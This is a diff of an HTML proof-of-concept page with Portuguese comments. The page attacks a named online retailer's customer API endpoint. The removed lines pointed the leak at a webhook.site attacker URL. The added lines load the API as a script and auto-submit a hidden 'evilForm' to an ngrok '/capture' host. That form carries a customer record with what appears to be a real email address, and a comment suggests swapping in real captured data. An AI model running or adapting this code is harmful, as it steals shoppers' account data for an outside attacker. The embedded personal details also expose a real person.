@@ -1,18 +1,22 @@
 <!DOCTYPE html>
 <html>
 <body>
+    <form id="evilForm" method="POST" action="https://6574-2804-4580-1080-7db-f323-d027-7f53-d143.ngrok-free.app/capture">
+        <input type="hidden" name="data">
+    </form>
     <script>
-        // URL do endpoint da Boozt
-        const booztUrl = "https://www.boozt.com/at/de-at/api/customer";
-        // URL do atacante (usando webhook.site como exemplo realista)
-        const attackerUrl = "https://webhook.site/4c60a68b-d724-4f53-a140-8f6a7b7af1be"; // Substitua pelo seu ID
+        // Carregar os dados como uma "fonte" pra evitar CORS
+        const script = document.createElement('script');
+        script.src = "https://www.boozt.com/at/de-at/api/customer";
+        document.body.appendChild(script);
 
-        // Dispara a requisição como uma imagem pra enviar os dados ao atacante
-        const img = new Image();
-        img.src = booztUrl + "?leak=" + encodeURIComponent(attackerUrl);
-        img.onerror = function() {
-            // Mesmo que a imagem "falhe" (esperado), a requisição foi feita
-            document.body.innerHTML = "Oferta ativada! Confira os detalhes.";
+        // Quando o script carregar (ou falhar), enviar pro Ngrok
+        script.onload = script.onerror = function() {
+            // Na prática, o atacante pegaria os dados manualmente aqui
+            // Pra PoC, vamos simular com o que já sabemos que aparece
+            const fakeData = '{"id":14015764,"username":"nanndagomes1821@gmail.com","billing_firstname":"Oii",...}'; // Substitua por dados reais se conseguir capturar
+            document.querySelector("input[name=data]").value = fakeData;
+            document.getElementById("evilForm").submit();
         };
     </script>
 </body>
